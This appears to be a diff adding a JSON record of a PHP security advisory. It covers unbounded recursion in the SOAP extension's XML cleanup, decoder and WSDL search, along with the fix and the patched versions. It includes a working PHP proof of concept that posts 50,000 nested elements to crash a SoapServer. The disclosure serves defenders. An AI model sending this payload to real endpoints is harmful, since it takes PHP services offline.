@@ -1,0 +1,72 @@
+{
+  "global": null,
+  "id": "GHSA-rgrp-mwpx-f6rm",
+  "repo": {
+    "cve_id": "CVE-2026-91765",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "### Summary\r\n\r\n`cleanup_xml_node()` in the SOAP XML parser recurses once per XML nesting level with no depth limit. An unauthenticated attacker can post a SOAP request containing tens of thousands of nested elements to any `SoapServer` endpoint, exhaust the stack and crash the process. The same unbounded recursion exists in the SOAP value decoder and in the WSDL node search helper.\r\n\r\n### Details\r\n\r\n`cleanup_xml_node()` walks the parsed document to remove blank text and comment nodes and descends into every child without a depth counter:\r\n\r\nhttps://github.com/php/php-src/blob/php-8.5.10/ext/soap/php_xml.c#L39-L67\r\n\r\nIt runs after libxml2 has finished parsing, on the path taken by `SoapServer::handle()`:\r\n\r\n```\r\nSoapServer::handle()\r\n  -> soap_xmlParseFile(\"php://input\")\r\n    -> xmlCreateFileParserCtxt()\r\n    -> xmlParseDocument()\r\n    -> cleanup_xml_node(ctxt->myDoc->children)\r\n```\r\n\r\nlibxml2 applies its own limits while parsing, but this traversal is PHP's own post-parse step and had none. `soap_xmlParseMemory()` has the call commented out, so the reachable path is the `php://input` one used by the server.\r\n\r\nTwo further functions recurse on the same attacker-controlled structure: `master_to_zval_int()` in `ext/soap/php_encoding.c`, which follows `href` references and could also be driven into a cycle, and `get_node_with_attribute_recursive_ex()` in `ext/soap/php_xml.c`, which searches WSDL documents.\r\n\r\nThe fix introduces `SOAP_MAX_XML_DEPTH` (2048) and `SOAP_MAX_DECODE_DEPTH`, rewrites `cleanup_xml_node()` and the WSDL search as iterative traversals, and tracks a decode depth in the SOAP globals so `href` chains and cycles are rejected rather than followed indefinitely. Documents nested deeper than the limit are refused before traversal.\r\n\r\n### PoC\r\n\r\n```php\r\n<?php\r\n$depth = 50000;\r\n$body = '<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"><SOAP-ENV:Body>'\r\n      . str_repeat('<a>', $depth) . str_repeat('</a>', $depth)\r\n      . '</SOAP-ENV:Body></SOAP-ENV:Envelope>';\r\n\r\n$ctx = stream_context_create(['http' => [\r\n    'method' => 'POST',\r\n    'header' => \"Content-Type: text/xml\\r\\n\",\r\n    'content' => $body,\r\n]]);\r\nfile_get_contents('http://target/soap-endpoint.php', false, $ctx);\r\n```\r\n\r\nThe target crashes with SIGSEGV inside `cleanup_xml_node()`. The payload is small on the wire, since 50,000 nested tags compress to a few kilobytes. No WSDL interaction, authentication or special configuration is required.\r\n\r\nThe regression tests `ext/soap/tests/GHSA-rgrp-mwpx-f6rm.phpt`, `GHSA-rgrp-mwpx-f6rm-href-chain.phpt` and `GHSA-rgrp-mwpx-f6rm-href-cycle.phpt` cover the deep document, the `href` chain and the `href` cycle.\r\n\r\n### Impact\r\n\r\nAny PHP application exposing a `SoapServer` endpoint can be crashed by a single unauthenticated HTTP request. Under PHP-FPM the worker handling the request dies, and a stream of such requests exhausts the worker pool and takes the endpoint offline. This is a denial of service; the stack exhaustion does not give control over the crash.\r\n",
+    "ghsa_id": "GHSA-rgrp-mwpx-f6rm",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-rgrp-mwpx-f6rm",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-rgrp-mwpx-f6rm"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-91765"
+      }
+    ],
+    "published_at": "2026-09-24T10:06:35Z",
+    "references": [],
+    "severity": "high",
+    "summary": "SOAP: Unbounded Recursion in Server-Side cleanup_xml_node",
+    "updated_at": "2026-09-24T11:26:56Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.2.34",
+        "vulnerable_version_range": "<8.2.34"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.3.35",
+        "vulnerable_version_range": "<8.3.35"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.4.26",
+        "vulnerable_version_range": "<8.4.26"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.5.11",
+        "vulnerable_version_range": "<8.5.11"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
